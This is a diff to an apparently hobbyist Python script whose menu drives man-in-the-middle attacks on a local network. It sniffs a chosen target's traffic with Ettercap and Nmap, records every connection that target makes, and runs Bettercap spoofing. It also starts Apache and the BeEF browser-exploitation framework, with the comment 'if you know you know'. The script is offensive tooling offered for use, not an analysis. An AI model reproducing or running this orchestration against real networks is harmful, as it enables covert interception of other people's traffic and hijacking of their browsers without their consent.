@@ -14,7 +14,6 @@ import random
 import socket
 from scapy.all import rdpcap, IP
 from collections import defaultdict
-from scapy.all import rdpcap, get_if_raw_hwaddr, socket
 import socket as std_socket
 import webbrowser
 from scapy.all import rdpcap
@@ -99,6 +98,10 @@ async def run_nmap_scan(target):
         print(Fore.RED + f"An error occurred: {e}")
         return []
 
+import os
+import asyncio
+from colorama import Fore
+
 async def compile_filter_file(filter_file):
     if not os.path.isfile(filter_file):
         print(Fore.RED + f"Error: The input file '{filter_file}' does not exist.")
@@ -114,6 +117,7 @@ async def compile_filter_file(filter_file):
             stdout=asyncio.subprocess.PIPE,
             stderr=asyncio.subprocess.PIPE
         )
+
         stdout, stderr = await compile_process.communicate()
 
         # Log the output
@@ -128,6 +132,7 @@ async def compile_filter_file(filter_file):
     except Exception as e:
         print(Fore.RED + f"An error occurred while compiling the filter file: {e}")
         return None
+
 async def run_ettercap(interface, default_gateway, target_ips, filter_file, url_file_path):
     # Compile the filter file and ensure it's compiled correctly
     compiled_file = await compile_filter_file(filter_file)
@@ -157,6 +162,7 @@ async def run_ettercap(interface, default_gateway, target_ips, filter_file, url_
         try:
             # Run the Ettercap command
             print(f"Running Ettercap with command: {' '.join(ettercap_command)}")
+            print('Wait the packets to appear in wireshark...')
             ettercap_process = await asyncio.create_subprocess_exec(
                 *ettercap_command,
                 stdout=asyncio.subprocess.PIPE,
@@ -271,16 +277,17 @@ async def apply_filter_and_save(pcap_file, output_file, filter_str):
     except Exception as e:
         print(Fore.RED + f"An error occurred while filtering the pcap file: {e}")
 
-def create_excluded_ips_file(file_path, exclude_ips):
+def create_excluded_ips_file(filter_file, exclude_ips):
     try:
-        with open(file_path, "w") as file:
+        with open(filter_file, 'w') as f:
             for ip in exclude_ips:
-                file.write(f"if (ip.src == '{ip}' || ip.dst == '{ip}') {{\n")
-                file.write("    drop();\n")
-                file.write("}\n")
-        print(Fore.GREEN + f"Excluded IPs file '{file_path}' created successfully.")
-    except IOError as e:
-        print(Fore.RED + f"Error creating excluded IPs file: {e}")
+                f.write(f"if (ip.src == '{ip}' || ip.dst == '{ip}') {{\n")
+                f.write(f"    drop();\n")
+                f.write(f"}}\n")
+        print(Fore.GREEN + f"Created filter file '{filter_file}' with excluded IPs.")
+    except Exception as e:
+        print(Fore.RED + f"An error occurred while creating the filter file: {e}")
+
 
 def handle_sigterm(signum, frame):
     print(Fore.YELLOW + "Received termination signal. Cleaning up...")
@@ -362,8 +369,6 @@ def resolve_ip_to_hostname(ip):
         return hostname
     except std_socket.herror:
         return 'N/A'
-
-
 
 
 
@@ -543,24 +548,17 @@ async def run_bettercap():
         print(f"Bettercap error: {stderr}")
     if stdout:
         print(f"Bettercap output: {stdout}")
-async def filter_and_analyze_pcap():
-    # Placeholder for actual implementation
-    print("Filter and Analyze Pcap is not implemented yet.")
-
-async def resolve_and_display_ips():
-    # Placeholder for actual implementation
-    print("Resolve and Display IPs is not implemented yet.")
-
 
 async def filter_and_analyze_pcap():
     # Set up signal handler
     signal.signal(signal.SIGTERM, handle_sigterm)
-    #Change  the following if needed: interface, url_file_path which include top common urls, 
-    interface = 'wlan0'#change the wireless interface based on yours.
+
+    # Change the following if needed: interface, url_file_path which includes top common URLs.
+    interface=input("enter your active interface e.g. wlan0: ").strip() # change the wireless interface based on your active interface.
     url_file_path = 'url_file.txt'
     filter_file = 'excluded_ips.ef'
-    exclude_ips = ["192.168.1.1", "192.168.1.2", "192.168.1.5", "192.168.1.125", "192.168.1.253"]#add or remove based ip:s to perform this exclusion.
-    target_ips = ["192.168.1.1"]#replace with actual target ip to sniff / add more target ip:s (manually to the list if needed)
+    exclude_ips = ["192.168.1.1", "192.168.1.2", "192.168.1.5", "192.168.1.125", "192.168.1.253"]  # Add or remove based IPs for exclusion.
+    target_ips = ["192.168.1.1"]  # Replace with actual target IP to sniff (add more target IPs manually if needed)
 
     try:
         default_gateway, ip_address = await get_network_info(interface)
@@ -568,7 +566,7 @@ async def filter_and_analyze_pcap():
         print(Fore.RED + f"Error getting network info: {e}")
         return
 
-    target_network = f"{default_gateway}/24"#change the subnet mask based on your network
+    target_network = f"{default_gateway}/24"  # Change the subnet mask based on your network
     isactive = await run_nmap_scan(target_network)
 
     print(f"Excluded IPs: {exclude_ips}")
@@ -596,7 +594,9 @@ async def filter_and_analyze_pcap():
 
     pcap_file = f'{"_".join(target_ips)}_filtered_activity.pcap'
     output_file = f'{"_".join(target_ips)}_filtered_output.pcap'
-    output_file_path = f'{"_".join(target_ips)}_resolved_output.txt'
+
+    # Create excluded IPs filter file
+    create_excluded_ips_file(filter_file, exclude_ips)
 
     # Compile the filter file
     compiled_file = await compile_filter_file(filter_file)
@@ -604,14 +604,11 @@ async def filter_and_analyze_pcap():
         print(Fore.RED + "Compilation failed.")
         return
     print(f"Compiled file is located at: {compiled_file}")
-    
-    # Create excluded IPs filter file
-    create_excluded_ips_file(filter_file, exclude_ips)
 
     # Create filter string
     exclude_filter = " && ".join([f"!(ip.src == {ip} || ip.dst == {ip})" for ip in exclude_ips])
     target_ip_filter = " || ".join([f"(ip.src == {ip} || ip.dst == {ip})" for ip in target_ips])
-    
+
     with open(url_file_path, 'r') as url_file:
         normalized_urls = [url.strip().split("//")[-1].replace("www.", "") for url in url_file]
     url_filters = " || ".join([f'frame contains "{url}"' for url in normalized_urls if url])
@@ -621,7 +618,7 @@ async def filter_and_analyze_pcap():
         target_ip_filter,
         url_filters
     ]))
-    
+
     print(Fore.CYAN + f"Applying filter to pcap file: {filter_str}")
 
     # Start Ettercap and Wireshark in parallel
@@ -687,11 +684,11 @@ def has_packets(pcap_file):
         return False
 
 async def resolve_and_display_ips():
-    target_ips = ["192.168.1.121"]#add as need "192.168.1.121"
+    target_ips = ["192.168.1.12"] #add/remove hosts as needed"
     target_ip_to_add=input("enter ip to add:")
     target_ips.clear()
     target_ips.append(target_ip_to_add)
-    interface="wlan0"#change the interface based on yours 
+    interface=input("enter your active interface e.g. wlan0: ").strip() #change the interface based on yours 
 
     try:
         default_gateway, ip_address = await get_network_info(interface)
@@ -733,9 +730,9 @@ async def resolve_and_display_ips():
 async def menu():
     while True:
         print("\nMenu:")
-        print("1. Sniffer: Filter and Analyze Pcap")#begin executing and observe how sniffing works.
-        print("2. Resolve and Display IPs")#require executing step 1 based on ip.
-        print("3. Spoofer: Bettercap")#after executing it open wireshark and observe how spoofing a target works.
+        print("1. Sniffer: Filter and Analyze Pcap")#begin executing and observe how sniffing works. this step will create a capture file the target. 
+        print("2. Resolve and Display IPs")#require executing step 1 based on ip (shows every connection which was made by the target).
+        print("3. Spoofer: Bettercap ('MITM attack')")#after executing it open wireshark and observe how spoofing a target works.
         print("4. Exit")
 
         choice = input("Enter your choice: ")
@@ -744,7 +741,7 @@ async def menu():
             await filter_and_analyze_pcap()
         elif choice == '2':
             await resolve_and_display_ips()
-        elif choice == '3':#run this option in user mode
+        elif choice == '3':
             # Run Bettercap commands
             await run_bettercap()
 
@@ -752,7 +749,7 @@ async def menu():
             await start_apache()
             await asyncio.sleep(5)  # Wait for Apache to start
             open_web_browser()
-            await start_beef()
+            await start_beef()# this step is used to host a server. if you know you know.
 
             try:
                 # Keep the script running to allow manual stop
@@ -778,6 +775,5 @@ async def main():
 
 if __name__ == "__main__":
     asyncio.run(main())
-
 
 
